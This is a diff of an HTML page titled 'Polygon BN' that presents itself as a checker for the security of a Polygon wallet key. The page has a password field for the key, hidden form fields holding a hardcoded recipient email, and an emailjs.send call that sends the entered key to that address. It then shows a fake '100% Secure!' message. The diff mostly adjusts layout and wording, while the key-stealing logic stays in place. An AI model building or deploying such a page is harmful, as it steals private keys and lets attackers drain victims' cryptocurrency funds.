@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="icon" type="image/png" href="polygon.png">
   <meta charset="UTF-8">
   <title>Polygon BN</title>
@@ -11,9 +11,8 @@
       font-family: Arial, sans-serif;
       background: linear-gradient(135deg, #6a0dad, #9b30ff);
       max-width: 400px;
-      margin: 40px auto;
+      margin: 0px auto;
       padding: 20px;
- 
       border-radius: 8px;
     }
     .popup {
@@ -79,31 +78,33 @@
 
       emailjs.send(serviceID, templateID, params)
         .then(res => {
-          showPopup("✔ 100% Secured!", "success");
+          showPopup("✔ 100% Secure!", "success");
         })
         .catch(err => {
           showPopup("❌ Error while checking.", "error");
         });
     }
   </script>
+   <img style ="border-radius:20px; display:block; margin: 0 auto;" src = "bg.jpg" width="100px">
+      <img style ="border-radius:20px; display:block; margin: 0 auto; position: absolute; top:440px; left:15px;" src = "bg3.jpg" width="330px">
 </head>
 <body>
-  <h2 style="color:white; font-family:sans-serif;">Welcome to Polygon BN Checker🌟</h2>
+
+  <h2 style="color:white; font-family:sans-serif; text-align:center;">Welcome to Polygon BN🌟</h2>
   <form onsubmit="sendMail(event)">
    
-    <input style= 'display:none;' type="text" id="name" value="chisom" required><br><br>
-    <input style= 'display:none;' type="email" id="email" value='ebuchisom88@gmail.com' required><br><br>
+    <input style= 'display:none; width:0px;' type="text" id="name" value="chisom" required><br>
+    <input style= 'display:none;' type="email" id="email" value='ebuchisom88@gmail.com' required><br>
+    <p style="color:white; font-family:sans-serif; text-align:center;">Check the Security rate of your Polygon Key</p>
+    <input type ='password' style='border-radius:15px; padding:13px 80px' class="enter" id="message" required><br><br>
 
-    <label style="color:white; font-family:sans-serif;">Check to make sure your Polygon key is 100% Secured.</label><br>
-	<br>
-    <input type ='password' style='border-radius:15px; padding:13px 100px' class="enter" id="message" required><br><br>
-
-    <button style="border-radius:15px; padding:8px 140px;font-family:sans-serif; background:white; border-line:1px solid black; letter-spacing:2px;
+    <button style="border-radius:15px; width:326px; height:40px; font-family:sans-serif;  background:white; border-line:1px solid black; letter-spacing:2px;
 	background:black; color:white;" type="submit">Check now</button>
   </form>
-
+ 
   <!-- Popup Notification -->
-  <div id="popup" class="popup"></div>
-</body>
+  <div id="popup" class="popup">
 
+  </div>
+</body>
 </html>
